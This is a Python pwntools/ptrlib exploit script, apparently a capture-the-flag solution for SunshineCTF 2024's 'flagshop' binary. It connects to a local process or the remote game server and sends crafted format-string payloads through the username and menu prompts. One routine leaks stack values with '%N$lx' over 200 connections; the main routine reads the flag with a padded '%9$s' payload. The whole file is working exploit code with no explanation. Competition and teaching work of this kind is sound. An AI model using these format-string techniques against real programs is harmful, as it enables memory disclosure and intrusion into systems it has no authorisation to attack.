#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./flagshop")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("2024.sunshinectf.games", 24001)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def dump():
    dump = ""

    for i in range(1, 200):
        io = connect()

        io.sendlineafter(b"\x1b[33m\n[ Enter your username ]\n\x1b[m", b"hello")
        io.sendlineafter(b"\x1b[33m[ Enter your pronouns ]\n\x1b[m", b"world")

        payload = b""
        payload += b"A" * 2  # padding
        payload += b"A" * 0x8  # username
        payload += f"#%{i}$lx#".encode()
        payload += b"A" * 0x20

        io.sendlineafter(
            b"\x1b[32m==========================================\n\n\x1b[33m[ 1) Access Admin Panel ]\n\x1b[33m[ 2) Print User Information ]\n\n\x1b[32m==========================================\n\x1b[m",
            payload,
        )

        io.sendlineafter(
            b"\x1b[32m==========================================\n\n\x1b[33m[ 1) Access Admin Panel ]\n\x1b[33m[ 2) Print User Information ]\n\n\x1b[32m==========================================\n\x1b[m",
            b"1",
        )

        io.recvuntil(b"#")
        leak = io.recvuntil(b"#").strip(b"#").decode()
        str = ptr.p64(int(leak, 16))
        dump += f"{i}: 0x{leak} {' ' * (16 - len(leak))} {str}\n"

        io.close()

    with open("./dump.txt", "w") as file:
        file.write(dump)

    return


def main():
    io = connect()

    io.sendlineafter(b"\x1b[33m\n[ Enter your username ]\n\x1b[m", b"hello")
    io.sendlineafter(b"\x1b[33m[ Enter your pronouns ]\n\x1b[m", b"world")

    payload1 = b""
    payload1 += b"A" * 2  # padding
    payload1 += b"A" * 0x8  # username
    payload1 += f"#%9$s#".encode()
    payload1 = payload1.ljust(0x11B, b"A")
    payload1 += b"."

    io.sendlineafter(
        b"\x1b[32m==========================================\n\n\x1b[33m[ 1) Access Admin Panel ]\n\x1b[33m[ 2) Print User Information ]\n\n\x1b[32m==========================================\n\x1b[m",
        payload1,
    )

    io.sendlineafter(
        b"\x1b[32m==========================================\n\n\x1b[33m[ 1) Access Admin Panel ]\n\x1b[33m[ 2) Print User Information ]\n\n\x1b[32m==========================================\n\x1b[m",
        b"1",
    )

    io.recvuntil(b"#")
    flag = io.recvuntil(b"#").strip(b"#").decode()

    ptr.logger.info(f"flag: {flag}")

    io.close()
    exit()


if __name__ == "__main__":
    # dump()
    main()
